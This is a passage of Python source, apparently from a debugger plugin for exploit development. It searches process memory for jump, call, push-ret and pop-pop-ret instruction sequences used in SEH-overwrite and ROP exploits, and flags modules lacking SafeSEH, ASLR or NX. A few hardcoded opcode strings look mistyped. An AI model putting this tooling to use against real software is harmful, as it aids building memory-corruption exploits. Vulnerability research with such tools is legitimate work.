	bytes = splitAddress(address)
	chars = []
	for byte in bytes:
		chars.append(chr(byte))
	
	# check each char
	for char in chars:
		if char in badchars:
			return True			
	return False


def meetsCriteria(pointer,criteria):
	"""
	checks if an address meets the listed criteria

	Arguments:
	pointer - the MnPointer instance of the address
	criteria - a dictionary with all the criteria to be met

	Return:
	Boolean - True if all the conditions are met
	"""
	
	# Unicode
	if "unicode" in criteria and not (pointer.isUnicode or pointer.unicodeTransform != ""):
		return False
		
	if "unicoderev" in criteria and not pointer.isUnicodeRev:
		return False		
		
	# Ascii
	if "ascii" in criteria and not pointer.isAscii:
		return False
	
	# Ascii printable
	if "asciiprint" in criteria and not pointer.isAsciiPrintable:
		return False
	
	# Uppercase
	if "upper" in criteria and not pointer.isUppercase:
		return False
		
	# Lowercase
	if "lower" in criteria and not pointer.isLowercase:
		return False
	
	# Uppercase numeric
	if "uppernum" in criteria and not pointer.isUpperNum:
		return False
	
	# Lowercase numeric
	if "lowernum" in criteria and not pointer.isLowerNum:
		return False	
		
	# Numeric
	if "numeric" in criteria and not pointer.isNumeric:
		return False
	
	# Alpha numeric
	if "alphanum" in criteria and not pointer.isAlphaNumeric:
		return False
		
	# Bad chars
	if "badchars" in criteria and containsBadChars(pointer.getAddress(), criteria["badchars"]):
		return False

	# Nulls
	if "nonull" in criteria and pointer.hasNulls:
		return False
	
	if "startswithnull" in criteria and not pointer.startsWithNull:
		return False
	
	return True

def search(sequences,criteria=[]):
	"""
	Alias for 'searchInRange'
	search for byte sequences in a specified address range

	Arguments:
	sequences - array of byte sequences to search for
	start - the start address of the search (defaults to 0)
	end   - the end address of the search
	criteria - Dictionary containing the criteria each pointer should comply with

	Return:
	Dictionary (opcode sequence => List of addresses)
	"""	
	return searchInRange(sequences,criteria)
	
	
def searchInRange(sequences, start=0, end=TOP_USERLAND,criteria=[]):
	"""
	search for byte sequences in a specified address range

	Arguments:
	sequences - array of byte sequences to search for
	start - the start address of the search (defaults to 0)
	end   - the end address of the search
	criteria - Dictionary containing the criteria each pointer should comply with

	Return:
	Dictionary (opcode sequence => List of addresses)
	"""
	
	if not "accesslevel" in criteria:
		criteria["accesslevel"] = "*"
	global ptr_counter
	global ptr_to_get
	
	found_opcodes = {}
	
	if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):

		if not sequences:
			return {}
			
		# check that start is before end
		if start > end:
			start, end = end, start

		dbg.setStatusBar("Searching...")
		dbg.getMemoryPages()
		for a in dbg.MemoryPages.keys():

			if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):
		
				# get end address of the page
				page_start = a
				page_size = dbg.MemoryPages[a].getSize()
				page_end   = a + page_size
				
				if ( start > page_end or end < page_start ):
					# we are outside the search range, skip
					continue
				if (not meetsAccessLevel(dbg.MemoryPages[a],criteria["accesslevel"])):
					#skip this page, not executable
					continue
					
				# if the criteria check for nulls or unicode, we can skip
				# modules that start with 00
				start_fb = toHex(page_start)[0:2]
				end_fb = toHex(page_end)[0:2]
				if ( ("nonull" in criteria and criteria["nonull"]) and start_fb == "00" and end_fb == "00"  ):
					if not silent:
						dbg.log("      !Skipped search of range %08x-%08x (Has nulls)" % (page_start,page_end))
					continue
				
				if (( ("startswithnull" in criteria and criteria["startswithnull"]))
						and (start_fb != "00" or end_fb != "00")):
					if not silent:
						dbg.log("      !Skipped search of range %08x-%08x (Doesn't start with null)" % (page_start,page_end))
					continue

				mem = dbg.MemoryPages[a].getMemory()
				if not mem:
					continue
				
				# loop on each sequence
				for seq in sequences:
					if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):
						buf = None
						human_format = ""
						if type(seq) == str:
							human_format = seq.replace("\n"," # ")
							buf = dbg.assemble(seq)
						else:
							human_format = seq[0].replace("\n"," # ")
							buf = seq[1]
						
						recur_find   = []		
						
						buf_len      = len(buf)
						mem_list     = mem.split( buf )
						total_length = buf_len * -1
						
						for i in mem_list:
							total_length = total_length + len(i) + buf_len
							seq_address = a + total_length
							recur_find.append( seq_address )

						#The last one is the remaining slice from the split
						#so remove it from the list
						del recur_find[ len(recur_find) - 1 ]

						page_find = []
						for i in recur_find:
							if ( i >= start and i <= end ):
								
								ptr = MnPointer(i)

								# check if pointer meets criteria
								if not meetsCriteria(ptr, criteria):
									continue
								
								page_find.append(i)
								
								ptr_counter += 1
								if ptr_to_get > 0 and ptr_counter >= ptr_to_get:
								#stop search
									if human_format in found_opcodes:
										found_opcodes[human_format] += page_find
									else:
										found_opcodes[human_format] = page_find
									return found_opcodes
						#add current pointers to the list and continue		
						if len(page_find) > 0:
							if human_format in found_opcodes:
								found_opcodes[human_format] += page_find
							else:
								found_opcodes[human_format] = page_find
	return found_opcodes

# search for byte sequences in a module
def searchInModule(sequences, name,criteria=[]):
	"""
	search for byte sequences in a specified module

	Arguments:
	sequences - array of byte sequences to search for
	name - the name of the module to search in

	Return:
	Dictionary (text opcode => array of addresses)
	"""	
	
	module = dbg.getModule(name)
	if(not module):
		self.log("module %s not found" % name)
		return []
	
	# get the base and end address of the module
	start = module.getBaseAddress()
	end   = start + module.getSize()

	return searchInRange(sequences, start, end, criteria)

def getRangesOutsideModules():
	"""
	This function will enumerate all memory ranges that are not asssociated with a module
	
	Arguments : none
	
	Returns : array of arrays, each containing a start and end address
	"""	
	ranges=[]
	moduleranges=[]
	#get all ranges associated with modules
	#force full rebuild to get all modules
	populateModuleInfo()
	for thismodule,modproperties in g_modules.iteritems():
		top = 0
		base = 0
		for modprop,modval in modproperties.iteritems():
			if modprop == "top":
				top = modval
			if modprop == "base":
				base = modval
		moduleranges.append([base,top])
	#sort them
	moduleranges.sort()
	#get all ranges before, after and in between modules
	startpointer = 0
	endpointer = TOP_USERLAND
	for modbase,modtop in moduleranges:
		endpointer = modbase-1
		ranges.append([startpointer,endpointer])
		startpointer = modtop+1
	ranges.append([startpointer,TOP_USERLAND])
	#return array
	return ranges
	

def UnicodeTransformInfo(hexaddr):
	"""
	checks if the address can be used as unicode ansi transform
	
	Arguments:
	hexaddr  - a string containing the address in hex format (4 bytes - 8 characters)
	
	Return:
	string with unicode transform info, or empty if address is not unicode transform
	"""
	outstring = ""
	transform=0
	almosttransform=0
	begin = hexaddr[0] + hexaddr[1]
	middle = hexaddr[4] + hexaddr[5]
	twostr=hexaddr[2]+hexaddr[3]
	begintwostr = hexaddr[6]+hexaddr[7]
	threestr=hexaddr[4]+hexaddr[5]+hexaddr[6]
	fourstr=hexaddr[4]+hexaddr[5]+hexaddr[6]+hexaddr[7]
	beginfourstr = hexaddr[0]+hexaddr[1]+hexaddr[2]+hexaddr[3]
	threestr=threestr.upper()
	fourstr=fourstr.upper()
	begintwostr = begintwostr.upper()
	beginfourstr = beginfourstr.upper()
	uniansiconv = [  ["20AC","80"], ["201A","82"],
		["0192","83"], ["201E","84"], ["2026","85"],
		["2020","86"], ["2021","87"], ["02C6","88"],
		["2030","89"], ["0106","8A"], ["2039","8B"],
		["0152","8C"], ["017D","8E"], ["2018","91"],
		["2019","92"], ["201C","93"], ["201D","94"],
		["2022","95"], ["2013","96"], ["2014","97"],
		["02DC","98"], ["2122","99"], ["0161","9A"],
		["203A","9B"], ["0153","9C"], ["017E","9E"],
		["0178","9F"]
		]
	# 4 possible cases :
	# 00xxBBBB
	# 00xxBBBC (close transform)
	# AAAA00xx
	# AAAABBBB
	convbyte=""
	transbyte=""
	ansibytes=""
	#case 1 and 2
	if begin == "00":	
		for ansirec in uniansiconv:
			if ansirec[0]==fourstr:
				convbyte=ansirec[1]
				transbyte=ansirec[1]
				transform=1
				break
		if transform==1:
			outstring +="unicode ansi transformed : 00"+twostr+"00"+convbyte+","
		ansistring=""
		for ansirec in uniansiconv:
			if ansirec[0][:3]==threestr:
				if (transform==0) or (transform==1 and ansirec[1] <> transbyte):
					convbyte=ansirec[1]
					ansibytes=ansirec[0]
					ansistring=ansistring+"00"+twostr+"00"+convbyte+"->00"+twostr+ansibytes+" / "
					almosttransform=1
		if almosttransform==1:
			if transform==0:
				outstring += "unicode possible ansi transform(s) : " + ansistring
			else:
				outstring +=" / alternatives (close pointers) : " + ansistring
			
	#case 3
	if middle == "00":
		transform = 0
		for ansirec in uniansiconv:
			if ansirec[0]==beginfourstr:
				convbyte=ansirec[1]
				transform=1
				break
		if transform==1:
			outstring +="unicode ansi transformed : 00"+convbyte+"00"+begintwostr+","
	#case 4
	if begin != "00" and middle != "00":
		convbyte1=""
		convbyte2=""
		transform = 0
		for ansirec in uniansiconv:
			if ansirec[0]==beginfourstr:
				convbyte1=ansirec[1]
				transform=1
				break
		if transform == 1:
			for ansirec in uniansiconv:
				if ansirec[0]==fourstr:
					convbyte2=ansirec[1]
					transform=2	
					break						
		if transform==2:
			outstring +="unicode ansi transformed : 00"+convbyte1+"00"+convbyte2+","
	
	# done
	outstring = outstring.rstrip(" / ")
	
	if outstring:
		if not outstring.endswith(","):
			outstring += ","
	return outstring

	
def getSearchSequences(searchtype,searchcriteria="",type="",criteria={}):
	"""
	will build array with search sequences for a given search type
	
	Arguments:
	searchtype = "jmp", "seh"
	
	SearchCriteria (optional): 
		<register> in case of "jmp" : string containing a register
	
	Return:
	array with all searches to perform
	"""
	offsets = [ "", "0x04","0x08","0x0c","0x10","0x12","0x1C","0x20","0x24"]
	regs=["eax","ebx","ecx","edx","esi","edi","ebp"]
	search=[]
	
	if searchtype.lower() == "jmp":
		if not searchcriteria: 
			searchcriteria = "esp"
		searchcriteria = searchcriteria.lower()
	
		min = 0
		max = 0
		
		if "mindistance" in criteria:
			min = criteria["mindistance"]
		if "maxdistance" in criteria:
			max = criteria["maxdistance"]
		
		minval = min
		
		while minval <= max:
		
			extraval = ""
			
			if minval <> 0:
				operator = ""
				negoperator = "-"
				if minval < 0:
					operator = "-"
					negoperator = ""
				thisval = str(minval).replace("-","")
				thishexval = toHex(int(thisval))
				
				extraval = operator + thishexval
			
			if minval == 0:
				search.append("jmp " + searchcriteria )
				search.append("call " + searchcriteria)
				
				for roffset in offsets:
					search.append("push "+searchcriteria+"\nret "+roffset)
					
				for reg in regs:
					if reg != searchcriteria:
						search.append("push " + searchcriteria + "\npop "+reg+"\njmp "+reg)
						search.append("push " + searchcriteria + "\npop "+reg+"\ncall "+reg)			
						search.append("mov "+reg+"," + searchcriteria + "\njmp "+reg)
						search.append("mov "+reg+"," + searchcriteria + "\ncall "+reg)
						search.append("xchg "+reg+","+searchcriteria+"\njmp " + reg)
						search.append("xchg "+reg+","+searchcriteria+"\ncall " + reg)				
						for roffset in offsets:
							search.append("push " + searchcriteria + "\npop "+reg+"\npush "+reg+"\nret "+roffset)			
							search.append("mov "+reg+"," + searchcriteria + "\npush "+reg+"\nret "+roffset)
							search.append("xchg "+reg+","+searchcriteria+"\npush " + reg + "\nret " + roffset)	
			else:
				# offset jumps
				search.append("add " + searchcriteria + "," + operator + thishexval + "\njmp " + searchcriteria)
				search.append("add " + searchcriteria + "," + operator + thishexval + "\ncall " + searchcriteria)
				search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\njmp " + searchcriteria)
				search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\ncall " + searchcriteria)
				for roffset in offsets:
					search.append("add " + searchcriteria + "," + operator + thishexval + "\npush " + searchcriteria + "\nret " + roffset)
					search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\npush " + searchcriteria + "\nret " + roffset)
				if minval > 0:
					search.append("jmp " + searchcriteria + extraval)
					search.append("call " + searchcriteria + extraval)
			minval += 1

	if searchtype.lower() == "seh":
		for roffset in offsets:
			for r1 in regs:
				search.append( ["add esp,4\npop " + r1+"\nret "+roffset,dbg.assemble("add esp,4\npop " + r1+"\nret "+roffset)] )
				search.append( ["pop " + r1+"\nadd esp,4\nret "+roffset,dbg.assemble("pop " + r1+"\nadd esp,4\nret "+roffset)] )				
				for r2 in regs:
					thissearch = ["pop "+r1+"\npop "+r2+"\nret "+roffset,dbg.assemble("pop "+r1+"\npop "+r2+"\nret "+roffset)]
					search.append( thissearch )
					if type == "rop":
						search.append( ["pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset,dbg.assemble("pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset)] )
						for r3 in regs:
							search.append( ["pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]",dbg.assemble("pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]")] )
			search.append( ["add esp,8\nret "+roffset,dbg.assemble("add esp,8\nret "+roffset)])
			search.append( ["popad\npush ebp\nret "+roffset,dbg.assemble("popad\npush ebp\nret "+roffset)])					
		#popad + jmp/call
		search.append(["popad\njmp ebp",dbg.assemble("popad\njmp ebp")])
		search.append(["popad\ncall ebp",dbg.assemble("popad\ncall ebp")])		
		#call / jmp dword
		search.append(["call dword ptr ss:[esp+08]","\xff\x54\x24\x08"])
		search.append(["call dword ptr ss:[esp+08]","\xff\x94\x24\x08\x00\x00\x00"])
		search.append(["call dword ptr ds:[esp+08]","\x3e\xff\x54\x24\x08"])

		search.append(["jmp dword ptr ss:[esp+08]","\xff\x64\x24\x08"])
		search.append(["jmp dword ptr ss:[esp+08]","\xff\xa4\x24\x08\x00\x00\x00"])
		search.append(["jmp dword ptr ds:[esp+08]","\x3e\ff\x64\x24\x08"])
		
		search.append(["call dword ptr ss:[esp+14]","\xff\x54\x24\x14"])
		search.append(["call dword ptr ss:[esp+14]","\xff\x94\x24\x14\x00\x00\x00"])	
		search.append(["call dword ptr ds:[esp+14]","\x3e\xff\x54\x24\x14"])
		
		search.append(["jmp dword ptr ss:[esp+14]","\xff\x54\x24\x14"])
		search.append(["jmp dword ptr ss:[esp+14]","\xff\xa4\x24\x14\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[esp+14]","\x3e\xff\x54\x24\x14"])
		
		search.append(["call dword ptr ss:[esp+1c]","\xff\x54\x24\x1c"])
		search.append(["call dword ptr ss:[esp+1c]","\xff\x94\x24\x1c\x00\x00\x00"])		
		search.append(["call dword ptr ds:[esp+1c]","\x3e\xff\x54\x24\x1c"])
		
		search.append(["jmp dword ptr ss:[esp+1c]","\xff\x54\x24\x1c"])
		search.append(["jmp dword ptr ss:[esp+1c]","\xff\xa4\x24\x1c\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[esp+1c]","\x3e\xff\x54\x24\x1c"])
		
		search.append(["call dword ptr ss:[esp+2c]","\xff\x54\x24\x2c"])
		search.append(["call dword ptr ss:[esp+2c]","\xff\94\x24\x2c\x00\x00\x00"])
		search.append(["call dword ptr ds:[esp+2c]","\x3e\xff\x54\x24\x2c"])

		search.append(["jmp dword ptr ss:[esp+2c]","\xff\x54\x24\x2c"])
		search.append(["jmp dword ptr ss:[esp+2c]","\xff\xa4\x24\x2c\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[esp+2c]","\x3e\xff\x54\x24\x2c"])
		
		search.append(["call dword ptr ss:[esp+44]","\xff\x54\x24\x44"])
		search.append(["call dword ptr ss:[esp+44]","\xff\x94\x24\x44\x00\x00\x00"])		
		search.append(["call dword ptr ds:[esp+44]","\x3e\xff\x54\x24\x44"])		
		
		search.append(["jmp dword ptr ss:[esp+44]","\xff\x54\x24\x44"])
		search.append(["jmp dword ptr ss:[esp+44]","\xff\xa4\x24\x44\x00\x00\x00"])
		search.append(["jmp dword ptr ds:[esp+44]","\x3e\xff\x54\x24\x44"])
		
		search.append(["call dword ptr ss:[esp+50]","\xff\x54\x24\x50"])
		search.append(["call dword ptr ss:[esp+50]","\xff\x94\x24\x50\x00\x00\x00"])		
		search.append(["call dword ptr ds:[esp+50]","\x3e\xff\x54\x24\x50"])		
		
		search.append(["jmp dword ptr ss:[esp+50]","\xff\x54\x24\x50"])
		search.append(["jmp dword ptr ss:[esp+50]","\xff\xa4\x24\x50\x00\x00\x00"])
		search.append(["jmp dword ptr ds:[esp+50]","\x3e\xff\x54\x24\x50"])
		
		search.append(["call dword ptr ss:[ebp+0c]","\xff\x55\x0c"])
		search.append(["call dword ptr ss:[ebp+0c]","\xff\x95\x0c\x00\x00\x00"])		
		search.append(["call dword ptr ds:[ebp+0c]","\x3e\xff\x55\x0c"])		
		
		search.append(["jmp dword ptr ss:[ebp+0c]","\xff\x65\x0c"])
		search.append(["jmp dword ptr ss:[ebp+0c]","\xff\xa5\x0c\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[ebp+0c]","\x3e\xff\x65\x0c"])		
		
		search.append(["call dword ptr ss:[ebp+24]","\xff\x55\x24"])
		search.append(["call dword ptr ss:[ebp+24]","\xff\x95\x24\x00\x00\x00"])		
		search.append(["call dword ptr ds:[ebp+24]","\x3e\xff\x55\x24"])
		
		search.append(["jmp dword ptr ss:[ebp+24]","\xff\x65\x24"])
		search.append(["jmp dword ptr ss:[ebp+24]","\xff\xa5\x24\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[ebp+24]","\x3e\xff\x65\x24"])	
		
		search.append(["call dword ptr ss:[ebp+30]","\xff\x55\x30"])
		search.append(["call dword ptr ss:[ebp+30]","\xff\x95\x30\x00\x00\x00"])		
		search.append(["call dword ptr ds:[ebp+30]","\x3e\xff\x55\x30"])
		
		search.append(["jmp dword ptr ss:[ebp+30]","\xff\x65\x30"])
		search.append(["jmp dword ptr ss:[ebp+30]","\xff\xa5\x30\x00\x00\x00"])		
		search.append(["jmp dword ptr ds:[ebp+30]","\x3e\xff\x65\x30"])	
		
		search.append(["call dword ptr ss:[ebp-04]","\xff\x55\xfc"])
		search.append(["call dword ptr ss:[ebp-04]","\xff\x95\xfc\xff\xff\xff"])		
		search.append(["call dword ptr ds:[ebp-04]","\x3e\xff\x55\xfc"])
		
		search.append(["jmp dword ptr ss:[ebp-04]","\xff\x65\xfc",])
		search.append(["jmp dword ptr ss:[ebp-04]","\xff\xa5\xfc\xff\xff\xff",])		
		search.append(["jmp dword ptr ds:[ebp-04]","\x3e\xff\x65\xfc",])		
		
		search.append(["call dword ptr ss:[ebp-0c]","\xff\x55\xf4"])
		search.append(["call dword ptr ss:[ebp-0c]","\xff\x95\xf4\xff\xff\xff"])		
		search.append(["call dword ptr ds:[ebp-0c]","\x3e\xff\x55\xf4"])
		
		search.append(["jmp dword ptr ss:[ebp-0c]","\xff\x65\xf4",])
		search.append(["jmp dword ptr ss:[ebp-0c]","\xff\xa5\xf4\xff\xff\xff",])		
		search.append(["jmp dword ptr ds:[ebp-0c]","\x3e\xff\x65\xf4",])
		
		search.append(["call dword ptr ss:[ebp-18]","\xff\x55\xe8"])
		search.append(["call dword ptr ss:[ebp-18]","\xff\x95\xe8\xff\xff\xff"])		
		search.append(["call dword ptr ds:[ebp-18]","\x3e\xff\x55\xe8"])
		
		search.append(["jmp dword ptr ss:[ebp-18]","\xff\x65\xe8",])
		search.append(["jmp dword ptr ss:[ebp-18]","\xff\xa5\xe8\xff\xff\xff",])		
		search.append(["jmp dword ptr ds:[ebp-18]","\x3e\xff\x65\xe8",])
	return search

	
def getModulesToQuery(criteria):
	"""
	This function will return an array of modulenames
	
	Arguments:
	Criteria - dictionary with module criteria
	
	Return:
	array with module names that meet the given criteria
	
	"""	
	if len(g_modules) == 0:
		populateModuleInfo()
	modulestoquery=[]
	for thismodule,modproperties in g_modules.iteritems():
		#is this module excluded ?
		thismod = MnModule(thismodule)	
		included = True
		if not thismod.isExcluded:
			#check other criteria
			if ("safeseh" in criteria) and ((not criteria["safeseh"]) and thismod.isSafeSEH):
				included = False
			if ("aslr" in criteria) and ((not criteria["aslr"]) and thismod.isAslr):
				included = False
			if ("rebase" in criteria) and ((not criteria["rebase"]) and thismod.isRebase):
				included = False
			if ("os" in criteria) and ((not criteria["os"]) and thismod.isOS):
				included = False
			if ("nx" in criteria) and ((not criteria["nx"]) and thismod.isNX):
				included = False				
		else:
			included = False
		#override all previous decision if "modules" criteria was provided
		thismodkey = thismod.moduleKey.lower().strip()
		if ("modules" in criteria) and (criteria["modules"] != ""):
			included = False
			modulenames=criteria["modules"].split(",")
			for modulename in modulenames:
				modulename = modulename.strip('"').strip("'").lower()
				modulenamewithout = modulename.replace("*","")
				if len(modulenamewithout) <= len(thismodkey):
					#endswith ?
					if modulename[0] == "*":
						if modulenamewithout == thismodkey[len(thismodkey)-len(modulenamewithout):len(thismodkey)]:
							if not thismod.moduleKey in modulestoquery and not thismod.isExcluded:
								modulestoquery.append(thismod.moduleKey)
					#startswith ?
					if modulename[len(modulename)-1] == "*":
						if (modulenamewithout == thismodkey[0:len(modulenamewithout)] and not thismod.isExcluded):
							if not thismod.moduleKey in modulestoquery:
								modulestoquery.append(thismod.moduleKey)
					#contains ?
					if ((modulename[0] == "*" and modulename[len(modulename)-1] == "*") or (modulename.find("*") == -1)) and not thismod.isExcluded:
						if thismodkey.find(modulenamewithout) > -1:
							if not thismod.moduleKey in modulestoquery:
								modulestoquery.append(thismod.moduleKey)

		if included:
			modulestoquery.append(thismod.moduleKey)		
	return modulestoquery	
	
	
	
def getPointerAccess(address):
	"""
	Returns access level of specified address, in human readable format
	
	Arguments:
	address - integer value
	
	Return:
	Access level (human readable format)
	"""
	global MemoryPageACL

	paccess = ""
	try:
		page   = dbg.getMemoryPageByAddress( address )
		if page in MemoryPageACL:
			paccess = MemoryPageACL[page]
		else:
			paccess = page.getAccess( human = True )
			MemoryPageACL[page] = paccess
	except:
		paccess = ""
	return paccess


def getModuleProperty(modname,parameter):
	"""
	Returns value of a given module property
	Argument : 
	modname - module name
	parameter name - (see populateModuleInfo())
	
	Returns : 
	value associcated with the given parameter / module combination
	
	"""
	modname=modname.strip()
	parameter=parameter.lower()
	valtoreturn=""
	# try case sensitive first
	for thismodule,modproperties in g_modules.iteritems():
		if thismodule.strip() == modname:
			return modproperties[parameter]
	return valtoreturn


def populateModuleInfo():
	"""
	Populate global dictionary with information about all loaded modules
	
	Return:
	Dictionary
	"""
	if not silent:
		dbg.setStatusBar("Getting modules info...")
		dbg.log("[+] Generating module info table, hang on...")
		dbg.log("    - Processing modules")
		dbg.updateLog()
	global g_modules
	g_modules={}
	allmodules=dbg.getAllModules()
	curmod = ""
	for key in allmodules.keys():
		modinfo={}
		thismod = MnModule(key)
		if not thismod is None:
			modinfo["path"]		= thismod.modulePath
			modinfo["base"] 	= thismod.moduleBase
			modinfo["size"] 	= thismod.moduleSize
			modinfo["top"]  	= thismod.moduleTop
			modinfo["safeseh"]	= thismod.isSafeSEH
			modinfo["aslr"]		= thismod.isAslr
			modinfo["nx"]		= thismod.isNX
			modinfo["rebase"]	= thismod.isRebase
			modinfo["version"]	= thismod.moduleVersion
			modinfo["os"]		= thismod.isOS
			modinfo["name"]		= key
			modinfo["entry"]	= thismod.moduleEntry
			modinfo["codebase"]	= thismod.moduleCodebase
			modinfo["codesize"]	= thismod.moduleCodesize
			modinfo["codetop"]	= thismod.moduleCodetop
			g_modules[thismod.moduleKey] = modinfo
		else:
			if not silent:
				dbg.log("    - Oops, potential issue with module %s, skipping module" % key)
	if not silent:
		dbg.log("    - Done. Let's rock 'n roll.")
		dbg.setStatusBar("")	
		dbg.updateLog()

def ModInfoCached(modulename):
	"""
	Check if the information about a given module is already cached in the global Dictionary
	
	Arguments:
	modulename -  name of the module to check
	
	Return:
	Boolean - True if the module info is cached
	"""
	if (getModuleProperty(modulename,"base") == ""):
		return False
	else:
		return True

def showModuleTable(logfile="", modules=[]):
	"""
	Shows table with all loaded modules and their properties.

	Arguments :
	empty string - output will be sent to log window
	or
	filename - output will be written to the filename
	
	modules - dictionary with modules to query - result of a populateModuleInfo() call
	"""	
	thistable = ""
	if len(g_modules) == 0:
		populateModuleInfo()
	thistable += "----------------------------------------------------------------------------------------------------------------------------------\n"
	thistable += " Module info :\n"
	thistable += "----------------------------------------------------------------------------------------------------------------------------------\n"
	thistable += " Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path\n"
	thistable += "----------------------------------------------------------------------------------------------------------------------------------\n"

	for thismodule,modproperties in g_modules.iteritems():
		if (len(modules) > 0 and modproperties["name"] in modules or len(logfile)>0):
			rebase	= toSize(str(modproperties["rebase"]),7)
			base 	= toSize(str("0x" + toHex(modproperties["base"])),10)
			top 	= toSize(str("0x" + toHex(modproperties["top"])),10)
			size 	= toSize(str("0x" + toHex(modproperties["size"])),10)
			safeseh = toSize(str(modproperties["safeseh"]),7)
			aslr 	= toSize(str(modproperties["aslr"]),5)
			nx 		= toSize(str(modproperties["nx"]),7)
			isos 	= toSize(str(modproperties["os"]),7)
			version = str(modproperties["version"])
			path 	= str(modproperties["path"])
			name	= str(modproperties["name"])
			thistable += " " + base + " | " + top + " | " + size + " | " + rebase +"| " +safeseh + " | " + aslr + " |  " + nx + " | " + isos + "| " + version + " [" + name + "] (" + path + ")\n"
	thistable += "----------------------------------------------------------------------------------------------------------------------------------\n"
	tableinfo = thistable.split('\n')
	if logfile == "":
		for tline in tableinfo:
			dbg.log(tline)
	else:
		with open(logfile,"a") as fh:
			fh.writelines(thistable)
		
#-----------------------------------------------------------------------#
# This is where the action is
#-----------------------------------------------------------------------#	

def processResults(all_opcodes,logfile,thislog,specialcases = {}):
	"""
	Write the output of a search operation to log file

	Arguments:
	all_opcodes - dictionary containing the results of a search 
	logfile - the MnLog object
	thislog - the filename to write to

	Return:
	written content in log file
	first 20 pointers are shown in the log window
	"""
	ptrcnt = 0
	cnt = 0
	
	global silent
	
	if all_opcodes:
		dbg.log("[+] Writing results to %s" % thislog)
		for hf in all_opcodes:
			if not silent:
				try:
					dbg.log("    - Number of pointers of type '%s' : %d " % (hf,len(all_opcodes[hf])))
				except:
					dbg.log("    - Number of pointers of type '<unable to display>' : %d " % (len(all_opcodes[hf])))
		if not silent:
			dbg.log("[+] Results : ")
		messageshown = False
		for optext,pointers in all_opcodes.iteritems():
			for ptr in pointers:
				ptrinfo = ""
				modinfo = ""
				ptrx = MnPointer(ptr)
				modname = ptrx.belongsTo()
				if not modname == "":
					modobj = MnModule(modname)
					ptrextra = ""
					rva=0
					if (modobj.isRebase or modobj.isAslr):
						rva = ptr - modobj.moduleBase
						ptrextra = " (b+0x" + toHex(rva)+") "
					ptrinfo = "0x" + toHex(ptr) + ptrextra + " : " + optext + " | " + ptrx.__str__()  + " " + modobj.__str__()
				else:
					ptrinfo = "0x" + toHex(ptr) + " : " + optext + " | " + ptrx.__str__() 
					if ptrx.isOnStack():
						ptrinfo += " [Stack] "
					elif ptrx.isInHeap():
						ptrinfo += " [Heap] "
				logfile.write(ptrinfo,thislog)
				if (ptr_to_get > -1) or (cnt < 20):
					if not silent:
						dbg.log("  %s" % ptrinfo,address=ptr)
					cnt += 1
				ptrcnt += 1
				if (ptr_to_get == -1 or ptr_to_get > 20) and cnt == 20 and not silent and not messageshown:
					dbg.log("... Please wait while I'm processing all remaining results and writing everything to file...")
					messageshown = True
		if cnt < ptrcnt:
			if not silent:
				dbg.log("[+] Done. Only the first %d pointers are shown here. For more pointers, open %s..." % (cnt,thislog)) 
	dbg.log("    Found a total of %d pointers" % ptrcnt, highlight=1)
	dbg.setStatusBar("Done. Found %d pointers" % ptrcnt)
	
	
def mergeOpcodes(all_opcodes,found_opcodes):
	"""
	merges two dictionaries together

	Arguments:
	all_opcodes - the target dictionary
	found_opcodes - the source dictionary

	Return:
	Dictionary (merged dictionaries)
	"""
	if found_opcodes:
		for hf in found_opcodes:
			if hf in all_opcodes:
				all_opcodes[hf] += found_opcodes[hf]
			else:
				all_opcodes[hf] = found_opcodes[hf]
	return all_opcodes

	
def findSEH(modulecriteria={},criteria={}):
	"""
	Performs a search for pointers to gain code execution in a SEH overwrite exploit

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr, rebase and safeseh protected modules
	criteria - dictionary with criteria the pointers need to comply with.

	Return:
	Dictionary (pointers)
	"""
	type = ""
	if "rop" in criteria:
		type = "rop"
	search = getSearchSequences("seh",0,type) 
	
	found_opcodes = {}
	all_opcodes = {}
		
	modulestosearch = getModulesToQuery(modulecriteria)
	if not silent:
		dbg.log("[+] Querying %d modules" % len(modulestosearch))
	
	starttime = datetime.datetime.now()
	for thismodule in modulestosearch:
		if not silent:
			dbg.log("    - Querying module %s" % thismodule)
		dbg.updateLog()
		#search
		found_opcodes = searchInModule(search,thismodule,criteria)
		#merge results
		all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
	#search outside modules
	if "all" in criteria:
		if "accesslevel" in criteria:
			if criteria["accesslevel"].find("R") == -1:
				if not silent:
					dbg.log("[+] Setting pointer access level criteria to 'R', to increase search results")
				criteria["accesslevel"] = "R"
				if not silent:
					dbg.log("    New pointer access level : %s" % criteria["accesslevel"])
		if criteria["all"]:
			rangestosearch = getRangesOutsideModules()
			if not silent:
				dbg.log("[+] Querying memory outside modules")
			for thisrange in rangestosearch:
				if not silent:
					dbg.log("    - Querying 0x%08x - 0x%08x" % (thisrange[0],thisrange[1]))
				found_opcodes = searchInRange(search, thisrange[0], thisrange[1],criteria)
				all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
			if not silent:
				dbg.log("    - Search complete, processing results")
			dbg.updateLog()
	return all_opcodes
	

def findJMP(modulecriteria={},criteria={},register="esp"):
	"""
	Performs a search for pointers to jump to a given register

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	register - the register to jump to

	Return:
	Dictionary (pointers)
	"""
	search = getSearchSequences("jmp",register,"",criteria) 
	
	found_opcodes = {}
	all_opcodes = {}
		
	modulestosearch = getModulesToQuery(modulecriteria)
	if not silent:
		dbg.log("[+] Querying %d modules" % len(modulestosearch))
	
	starttime = datetime.datetime.now()
